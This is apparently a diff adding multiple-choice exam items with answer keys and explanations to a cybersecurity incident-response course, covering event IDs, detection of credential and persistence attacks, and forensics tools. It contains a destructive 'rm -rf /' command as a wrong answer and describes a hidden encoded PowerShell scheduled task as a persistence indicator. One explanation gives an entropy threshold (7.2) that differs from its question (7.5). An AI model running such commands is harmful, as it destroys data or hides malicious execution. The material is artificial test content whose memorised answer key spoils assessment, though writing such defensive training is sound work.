+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_29_a', text: 'Identical plaintext prefixes produce identical initial ciphertext blocks, enabling chosen-plaintext and dictionary reconstruction attacks', is_correct: true },
+              { id: 'f_opt_29_b', text: 'The private key is leaked in the TCP window field', is_correct: false },
+              { id: 'f_opt_29_c', text: 'The data transmission rate decreases by 50%', is_correct: false },
+              { id: 'f_opt_29_d', text: 'It causes the operating system kernel to crash', is_correct: false }
+            ],
+            explanation: 'CBC mode requires unpredictable, unique IVs per encryption. Reusing an IV reveals whether two plaintexts share the same initial block sequence.'
+          },
+          {
+            id: 'fe_30',
+            text: 'During an investigation into lateral movement, you analyze Windows Security Event ID 4648. What does this event represent?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_30_a', text: 'A user account was locked out by the domain controller', is_correct: false },
+              { id: 'f_opt_30_b', text: 'A logon was attempted using explicit credentials (e.g. runas.exe or tools passing explicit credentials across the network)', is_correct: true },
+              { id: 'f_opt_30_c', text: 'A Kerberos ticket was renewed automatically', is_correct: false },
+              { id: 'f_opt_30_d', text: 'An audit log was exported to an external drive', is_correct: false }
+            ],
+            explanation: 'Event ID 4648 logs whenever a process attempts to log on an account by explicitly specifying that account\'s credentials (e.g. runas or automated administrative scripts).'
+          },
+          {
+            id: 'fe_31',
+            text: 'Which Windows Defender feature isolates untrusted applications and Office attachments within a temporary hardware-isolated Hyper-V microVM?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_31_a', text: 'BitLocker Drive Encryption', is_correct: false },
+              { id: 'f_opt_31_b', text: 'Windows Disk Cleanup', is_correct: false },
+              { id: 'f_opt_31_c', text: 'Microsoft Defender Application Guard (MDAG)', is_correct: true },
+              { id: 'f_opt_31_d', text: 'Network Address Translation', is_correct: false }
+            ],
+            explanation: 'MDAG (Application Guard) uses container technology and Hyper-V isolation to open untrusted documents and web pages in an ephemeral microVM separate from the host OS.'
+          },
+          {
+            id: 'fe_32',
+            text: 'What does the \'SRV\' record in DNS resolve for Active Directory clients during domain controller discovery?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_32_a', text: 'The reverse lookup PTR for external web servers', is_correct: false },
+              { id: 'f_opt_32_b', text: 'The mail exchanger priority for spam filtering', is_correct: false },
+              { id: 'f_opt_32_c', text: 'The public SSH host key fingerprint', is_correct: false },
+              { id: 'f_opt_32_d', text: 'The IP address and port of specific services such as LDAP (_ldap._tcp) and Kerberos (_kerberos._tcp) available within the domain', is_correct: true }
+            ],
+            explanation: 'SRV records provide location data (hostname and port) for AD domain services like LDAP (_ldap._tcp.dc._msdcs.domain) and Kerberos.'
+          },
+          {
+            id: 'fe_33',
+            text: 'Which memory injection technique overwrites the address of a function in the Global Offset Table (GOT) of a running ELF binary on Linux?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_33_a', text: 'GOT Overwrite / PLT Hijacking', is_correct: true },
+              { id: 'f_opt_33_b', text: 'DLL Side-Loading', is_correct: false },
+              { id: 'f_opt_33_c', text: 'COM Hijacking', is_correct: false },
+              { id: 'f_opt_33_d', text: 'AppInit_DLLs injection', is_correct: false }
+            ],
+            explanation: 'In dynamically linked ELF binaries without Full RELRO, the Global Offset Table (GOT) holds resolved libc addresses. Overwriting GOT entries hijacks execution.'
+          },
+          {
+            id: 'fe_34',
+            text: 'An attacker leverages the \'printnightmare\' vulnerability (CVE-2021-34527). Which Windows service must be disabled or restricted to mitigate this exploit?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_34_a', text: 'Windows Audio service', is_correct: false },
+              { id: 'f_opt_34_b', text: 'Print Spooler (spoolsv.exe)', is_correct: true },
+              { id: 'f_opt_34_c', text: 'Remote Desktop Services', is_correct: false },
+              { id: 'f_opt_34_d', text: 'Windows Time (W32Time)', is_correct: false }
+            ],
+            explanation: 'PrintNightmare flaws in the Windows Print Spooler (spoolsv.exe) allow remote code execution and local privilege escalation via RpcAddPrinterDriverEx.'
+          },
+          {
+            id: 'fe_35',
+            text: 'Which specific file format stores the forensic contents of the Windows Registry transaction logs used to repair dirty hive states?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_35_a', text: '.EVTX files', is_correct: false },
+              { id: 'f_opt_35_b', text: '.PDB symbol databases', is_correct: false },
+              { id: 'f_opt_35_c', text: '.LOG1 and .LOG2 transaction logs', is_correct: true },
+              { id: 'f_opt_35_d', text: '.TMP cache files', is_correct: false }
+            ],
+            explanation: 'Windows Registry hives use write-ahead logging (.LOG1, .LOG2). Forensic tools replay transaction logs to reconstruct recent changes not yet flushed to the main hive.'
+          },
+          {
+            id: 'fe_36',
+            text: 'When triaging an AWS environment after a suspected credential compromise, which CloudTrail event indicates an adversary attempting to determine their effective IAM permissions?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_36_a', text: 's3:ListAllMyBuckets', is_correct: false },
+              { id: 'f_opt_36_b', text: 'ec2:DescribeInstances', is_correct: false },
+              { id: 'f_opt_36_c', text: 'iam:ChangePassword', is_correct: false },
+              { id: 'f_opt_36_d', text: 'sts:GetCallerIdentity', is_correct: true }
+            ],
+            explanation: 'sts:GetCallerIdentity is the universal reconnaissance call used by attackers to check the account ID, ARN, and IAM user/role associated with stolen AWS access keys.'
+          },
+          {
+            id: 'fe_37',
+            text: 'What does the presence of an unexpected scheduled task executing \'powershell -w hidden -nop -enc ...\' via Schtasks.exe represent?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_37_a', text: 'MITRE ATT&CK T1053.005 Scheduled Task persistence mechanism with execution evasion flags', is_correct: true },
+              { id: 'f_opt_37_b', text: 'Standard Windows Update telemetry collector', is_correct: false },
+              { id: 'f_opt_37_c', text: 'Hard disk fragmentation defrag task', is_correct: false },
+              { id: 'f_opt_37_d', text: 'A clean system restore point creation', is_correct: false }
+            ],
+            explanation: 'Adversaries weaponize schtasks to schedule hidden, non-interactive encoded PowerShell scripts for persistence and automated re-entry.'
+          },
+          {
+            id: 'fe_38',
+            text: 'Which Snort keyword ensures that an alert triggers only after a predefined threshold of packets matching the rule is reached within a set time window?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_38_a', text: 'rev:1', is_correct: false },
+              { id: 'f_opt_38_b', text: 'threshold: type limit, track by_src, count 10, seconds 60', is_correct: true },
+              { id: 'f_opt_38_c', text: 'classtype:bad-unknown', is_correct: false },
+              { id: 'f_opt_38_d', text: 'sid:100001', is_correct: false }
+            ],
+            explanation: 'Snort threshold options manage event suppression, tracking by source or destination IP, counting occurrences within an interval to reduce alarm fatigue.'
+          },
+          {
+            id: 'fe_39',
+            text: 'What does an analyst deduce when a binary\'s import address table (IAT) contains only LoadLibrary and GetProcAddress, with high file entropy (> 7.5)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_39_a', text: 'The binary is a standard .NET managed executable', is_correct: false },
+              { id: 'f_opt_39_b', text: 'The file has zero security risk and is completely safe', is_correct: false },
+              { id: 'f_opt_39_c', text: 'The binary is almost certainly packed or encrypted to evade static signature analysis', is_correct: true },
+              { id: 'f_opt_39_d', text: 'The program was compiled with MS-DOS 6.22', is_correct: false }
+            ],
+            explanation: 'A minimal IAT (LoadLibrary/GetProcAddress only) combined with high Shannon entropy (>7.2) is the canonical indicator of packed or encrypted malicious binaries.'
+          },
+          {
+            id: 'fe_40',
+            text: 'Which Sysinternals tool allows an incident responder to view active handles, locked DLLs, and open files associated with any running Windows process?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_40_a', text: 'TCPView only', is_correct: false },
+              { id: 'f_opt_40_b', text: 'BgInfo.exe', is_correct: false },
+              { id: 'f_opt_40_c', text: 'ZoomIt.exe', is_correct: false },
+              { id: 'f_opt_40_d', text: 'Handle.exe or Process Explorer (Ctrl+H / Ctrl+D)', is_correct: true }
+            ],
+            explanation: 'Sysinternals Handle and Process Explorer display all open kernel object handles, registry keys, and mapped DLLs held by active processes.'
+          },
+          {
+            id: 'fe_41',
+            text: 'What is the primary indicator of an adversary performing DCSync (T1003.006) in network telemetry?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_41_a', text: 'MS-DRSR (Directory Replication Service Remote Protocol) DsGetNCChanges RPC requests originating from a non-Domain Controller host', is_correct: true },
+              { id: 'f_opt_41_b', text: 'High volume of ICMP echo requests to the firewall', is_correct: false },
+              { id: 'f_opt_41_c', text: 'FTP file downloads over port 21', is_correct: false },
+              { id: 'f_opt_41_d', text: 'SNMP trap notifications to port 162', is_correct: false }
+            ],
+            explanation: 'DCSync pretends to be a domain controller requesting synchronization (DsGetNCChanges). Detecting this replication RPC call from a non-DC workstation catches the attack.'
+          },
+          {
+            id: 'fe_42',
+            text: 'In the context of the MITRE D3FEND defensive knowledge graph, which defensive technique counters \'Process Injection: Dynamic-link Library Injection\'?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_42_a', text: 'User Account Lockout', is_correct: false },
+              { id: 'f_opt_42_b', text: 'Process Spawn Analysis (D3-PSA) and Dynamic API Monitoring', is_correct: true },
+              { id: 'f_opt_42_c', text: 'Disk Defragmentation', is_correct: false },
+              { id: 'f_opt_42_d', text: 'Email DKIM signing', is_correct: false }
+            ],
+            explanation: 'D3FEND maps countermeasures against offensive techniques. Process Spawn Analysis and Dynamic API Monitoring intercept and flag unauthorized injection vectors.'
+          },
+          {
+            id: 'fe_43',
+            text: 'What does a sudden spike in DNS queries for domains resolving to 127.0.0.1 or 0.0.0.0 often indicate in enterprise network monitoring?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_43_a', text: 'A malfunctioning network gateway router', is_correct: false },
+              { id: 'f_opt_43_b', text: 'Adversary exfiltrating gigabytes of data over UDP', is_correct: false },
+              { id: 'f_opt_43_c', text: 'DNS Sinkholing successfully redirecting malicious C2 beacon traffic to a local loopback address', is_correct: true },
+              { id: 'f_opt_43_d', text: 'A corrupted Windows hosts file entry on the DNS server itself', is_correct: false }
+            ],
+            explanation: 'DNS Sinkholing intercepts requests for known malicious domains and responds with a safe address (such as 127.0.0.1 or a dedicated analysis sinkhole).'
+          },
+          {
+            id: 'fe_44',
+            text: 'Which Windows Security Event ID tracks whenever an access mask granting Full Control or Write permissions is added to a Discretionary Access Control List (DACL)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_44_a', text: 'Event ID 4624 (Logon success)', is_correct: false },
+              { id: 'f_opt_44_b', text: 'Event ID 4738 (A user account was modified)', is_correct: false },
+              { id: 'f_opt_44_c', text: 'Event ID 1100 (Eventlog service shutdown)', is_correct: false },
+              { id: 'f_opt_44_d', text: 'Event ID 4670 (Permissions on an object were changed)', is_correct: true }
+            ],
+            explanation: 'Event ID 4670 records changes to object DACLs, logging the original and new security descriptors, critical for detecting privilege escalation via ACL abuse.'
+          },
+          {
+            id: 'fe_45',
+            text: 'How does an incident response team safely contain a compromised Linux virtual machine without losing volatile RAM state?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_45_a', text: 'Isolate the VM\'s virtual NIC in a quarantined VLAN or apply host iptables drop rules while leaving the VM running to dump memory via LiME or hypervisor snapshot', is_correct: true },
+              { id: 'f_opt_45_b', text: 'Unplug the physical power cord from the server chassis immediately', is_correct: false },
+              { id: 'f_opt_45_c', text: 'Issue \'rm -rf /\' to destroy attacker files', is_correct: false },
+              { id: 'f_opt_45_d', text: 'Restart the server in Single-User Rescue Mode', is_correct: false }
+            ],
+            explanation: 'Cutting power or rebooting destroys volatile memory. Network isolation (or hypervisor snapshot) halts lateral movement while preserving the volatile RAM state for forensication.'
+          },
+          {
+            id: 'fe_46',
+            text: 'What is the purpose of the \'Golden SAML\' attack in federated cloud identity architectures (e.g. Okta / Azure AD)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_46_a', text: 'Cracking NTLM passwords using dictionary wordlists', is_correct: false },
+              { id: 'f_opt_46_b', text: 'Stealing the private token-signing certificate of the Active Directory Federation Services (AD FS) to forge SAML assertions as any user with arbitrary roles', is_correct: true },
+              { id: 'f_opt_46_c', text: 'Overloading SAML endpoints with spoofed XML packets', is_correct: false },
+              { id: 'f_opt_46_d', text: 'Bypassing multi-factor authentication via SMS interception', is_correct: false }
+            ],
+            explanation: 'Golden SAML requires compromising the AD FS token-signing certificate, allowing the attacker to mint valid SAML assertions for any cloud identity without needing user passwords.'
+          },
+          {
+            id: 'fe_47',
+            text: 'Which registry hive contains the \'Run\' and \'RunOnce\' keys used by adversaries for user-level persistence upon interactive logon?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_47_a', text: 'HKLM\\BCD00000000', is_correct: false },
+              { id: 'f_opt_47_b', text: 'HKCR\\CLSID', is_correct: false },
+              { id: 'f_opt_47_c', text: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', is_correct: true },
+              { id: 'f_opt_47_d', text: 'HKU\\.DEFAULT\\Control Panel', is_correct: false }
+            ],
+            explanation: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run executes binaries automatically whenever that specific user logs in, requiring no administrative privileges.'
+          },
+          {
+            id: 'fe_48',
+            text: 'What does a high ratio of TCP RST packets originating from an internal server toward external internet hosts generally signify in SOC egress telemetry?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_48_a', text: 'Standard NTP time synchronization', is_correct: false },
+              { id: 'f_opt_48_b', text: 'Routine Windows Update downloads', is_correct: false },
+              { id: 'f_opt_48_c', text: 'A healthy gigabit fiber connection', is_correct: false },
+              { id: 'f_opt_48_d', text: 'Malware attempting widespread outbound port scanning or C2 connections where ports are closed or firewalled', is_correct: true }
+            ],
+            explanation: 'Massive outbound RST packets indicate connection aborts, common when malware sweeps ranges of closed IP/ports during automated propagation or dead C2 failover.'
+          },
+          {
+            id: 'fe_49',
+            text: 'Which utility from the Volatility 3 framework extracts injected VAD (Virtual Address Descriptor) memory sections that have PAGE_EXECUTE_READWRITE permissions?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_49_a', text: 'windows.malfind.Malfind', is_correct: true },
+              { id: 'f_opt_49_b', text: 'windows.info.Info', is_correct: false },
+              { id: 'f_opt_49_c', text: 'windows.netscan.NetScan', is_correct: false },
+              { id: 'f_opt_49_d', text: 'windows.pstree.PsTree', is_correct: false }
+            ],
+            explanation: 'Volatility\'s malfind plugin scans VAD nodes looking for memory regions marked executable and writable (PAGE_EXECUTE_READWRITE) that are not backed by a file on disk.'
+          },
+          {
+            id: 'fe_50',
+            text: 'Under the NIST SP 800-61r2 Computer Security Incident Handling Guide, what is the required first action following the successful containment of an active enterprise intrusion?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_50_a', text: 'Immediately restore production systems without changing passwords', is_correct: false },
+              { id: 'f_opt_50_b', text: 'Eradication: Identify and eliminate all components of the incident, including deleting malware and closing breached user accounts', is_correct: true },
+              { id: 'f_opt_50_c', text: 'Publish a public press release before alerting executive leadership', is_correct: false },
+              { id: 'f_opt_50_d', text: 'Reboot all domain controllers in safe mode simultaneously', is_correct: false }
+            ],
+            explanation: 'NIST incident response lifecycle proceeds from Containment directly to Eradication (eliminating threat artifacts, rootkits, persistence hooks) prior to Recovery and Lessons Learned.'
+          }
       ]
     }
-  },
+    },
   {
     id: 'crs_cyber_fund',
     slug: 'cybersecurity-fundamentals',
